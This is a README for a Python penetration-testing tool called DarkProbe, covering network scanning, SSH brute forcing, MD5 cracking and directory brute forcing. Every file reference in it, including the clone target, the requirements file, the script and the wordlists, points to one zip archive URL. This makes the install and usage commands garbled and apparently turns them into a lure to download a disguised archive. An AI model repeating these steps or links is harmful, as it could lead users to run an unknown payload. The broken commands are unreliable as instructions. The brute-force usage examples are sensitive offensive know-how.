
# DarkProbe

**DarkProbe** is a Python-based cybersecurity tool designed for network scanning, brute forcing (SSH and password), hash cracking, and directory brute forcing. It is intended for security professionals and ethical hackers who want to test the security of systems and applications.

## Table of Contents
- [Installation](#installation)
- [Usage](#usage)
  - [Network Scan](#network-scan)
  - [SSH Brute Force](#ssh-brute-force)
  - [Hash Cracking](#hash-cracking)
  - [Directory Brute Force](#directory-brute-force)
- [Ethical Usage Guidelines](#ethical-usage-guidelines)
- [Flags and Modules](#flags-and-modules)
- [Contributing](#contributing)
- [License](#license)
- [Future Improvements](#future-improvements)

## Installation

### Requirements:
- Python 3.6+
- Pip (Python package manager)

### Steps:

1. Clone or download the repository:
   ```bash
   git clone https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip
   ```

2. Install the required libraries:
   Navigate to the project folder and run:
   ```bash
   pip install -r https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip
   ```

3. Place the necessary wordlists in the `wordlists` directory:
   - `https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip`: The password list for SSH brute force.
   - `https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip`: The list of directories to try for directory brute forcing.

## Usage

To run the tool, use the `https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip` file. The script will prompt the user for input and execute the corresponding security features. Here are the available modules:

### Network Scan:
Perform a network scan on a specific IP or host.
```bash
python https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip -n <target-ip>
```

### SSH Brute Force:
Perform an SSH brute force attack on a target server using the `https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip` wordlist.
```bash
python https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip -b <target-ip>
```
To specify a custom wordlist, use the `-w` flag:
```bash
python https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip -b <target-ip> -w <https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip>
```

### Hash Cracking (MD5):
Crack an MD5 hash to reveal the original password.
```bash
python https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip -H <md5_hash>
```

### Directory Brute Force:
Perform a directory brute force attack on a website.
```bash
python https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip -d <website-url>
```
To specify a custom directory wordlist, use the `-w` flag:
```bash
python https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip -d <website-url> -w <https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip>
```

## Ethical Usage Guidelines

**DarkProbe** should only be used for ethical and authorized testing. It is designed for penetration testers, security researchers, and cybersecurity professionals. Unauthorized use may be illegal. Here are the ethical guidelines:

1. **Do not use without permission**: Only use **DarkProbe** on systems or networks for which you have explicit permission. Unauthorized use may lead to legal consequences.
2. **Limit your scope**: Only scan systems or networks that you have permission to test.
3. **Protect personal data**: Do not attempt to crack or access personal or sensitive data without consent.
4. **Follow the law**: Ensure that penetration testing and security testing are legally permitted in your region.

## Flags and Modules

Here are the flags you can use with the **DarkProbe** tool:

- `-n` or `--network`: Perform a network scan on a specific IP or host.
- `-b` or `--bruteforce`: Perform an SSH brute force attack on a target server.
- `-H` or `--hash`: Crack an MD5 hash to reveal the original password.
- `-d` or `--directory`: Perform a directory brute force attack on a website.
- `-w` or `--wordlist`: Specify a custom wordlist for brute force or directory scanning.

Example usage:
```bash
python https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip -b <target-ip> -w https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip
python https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip -d <website-url> -w https://raw.githubusercontent.com/0xUnkn0wn4M1R/darkprobe/main/wordlists/languages/Software_3.8.zip
```

## Contributing

To contribute to this project, follow these steps:

1. Fork this repository.
2. Create a new branch (`git checkout -b feature-name`).
3. Make your changes and commit them (`git commit -am 'Add feature'`).
4. Push your branch (`git push origin feature-name`).
5. Open a Pull Request.

## License

This project is licensed under the MIT License.

## Future Improvements

Here are some future features or improvements that could be added to **DarkProbe**:

1. **Multi-threading/Concurrency**: Speed up brute force or scanning operations.
2. **Support for More Hash Algorithms**: Add support for cracking more types of hashes (e.g., SHA-1, SHA-256).
3. **Custom Output Directories**: Allow users to specify where the results should be saved.
4. **Advanced Scanning Features**: Add more network scanning capabilities (e.g., port scanning).
5. **GUI Interface**: Add a graphical user interface to make the tool more accessible.
6. **Password Strength Estimation**: Estimate the strength of passwords before brute-forcing them.
7. **Integration with Wordlist Repositories**: Directly download wordlists from repositories like SecLists or CrackStation.

---

Feel free to suggest any other features or improvements. Happy hacking! 😊
